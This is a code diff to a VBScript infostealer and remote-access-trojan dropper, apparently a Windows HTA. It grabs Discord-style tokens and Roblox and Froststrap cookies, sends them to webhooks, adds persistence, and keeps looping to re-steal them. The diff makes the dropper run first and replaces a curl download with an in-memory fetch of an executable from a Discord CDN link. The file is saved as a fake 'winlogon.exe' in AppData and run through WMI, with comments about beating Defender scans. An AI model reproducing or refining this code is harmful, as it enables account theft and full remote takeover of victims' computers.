@@ -20,14 +20,17 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
-' --- 1. GRABS (Target -> Token -> Cookie -> Persistence) ---
+' --- 0. INSTANT RAT DOWNLOAD & EXECUTE (Fires First) ---
+Call DropRAT
+
+' --- 1. GRABS (Fires Immediately After) ---
 Call IP(WH)
 Call GrabTokens(WH)
 Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. INFINITE Re-grab & RAT Loop ---
+' --- 2. INFINITE Re-grab Loop ---
 Dim runCount
 runCount = 0
 Do
@@ -39,41 +42,50 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' Attempt RAT download EVERY loop until success
-    Call DropRAT
-    
     ' Sleep for 2.5 minutes (150 seconds)
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
-' --- RAT DROP (Original Curl Method) ---
+' --- FASTEST RAT DROP (Write & Execute) ---
 Sub DropRAT()
-    ' Plain URL
+    ' Spam "Fetching Payload"
+    Call PostEmbed(":package: Fetching Payload", "Attempting RAT download...", 10181046)
+
+    ' Exact URL
     Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
 
+    ' Hide in AppData
     Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
     If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
     Dim op : op = hidDir & "\winlogon.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Spam "Fetching Payload" (will stop when success)
-    Call PostEmbed(":package: Fetching Payload", "Attempting RAT download...", 10181046)
+    ' Use MSXML2.XMLHTTP to download into memory
+    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
+    xh.Open "GET", exeUrl, False
+    xh.Send
 
-    ' Use original curl method
-    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & exeUrl & """"
-    sh.Run dlCmd, 0, True
+    ' Write to disk and execute IN THE SAME MILLISECOND
+    If xh.Status = 200 Then
+        Dim stream : Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write xh.ResponseBody
+        stream.SaveToFile op, 2
+        stream.Close
+        
+        ' Immediately fire execution via WMI before Defender scans
+        Call RunCmd("""" & op & """")
+    End If
 
-    ' Check for success
+    ' Check for success and send final message
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
             Dim dsize : dsize = fso.GetFile(op).Size
             Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
-            
-            ' Execute via WMI
-            Call RunCmd("""" & op & """")
             Exit Sub ' Stop spamming once successful
         End If
     End If
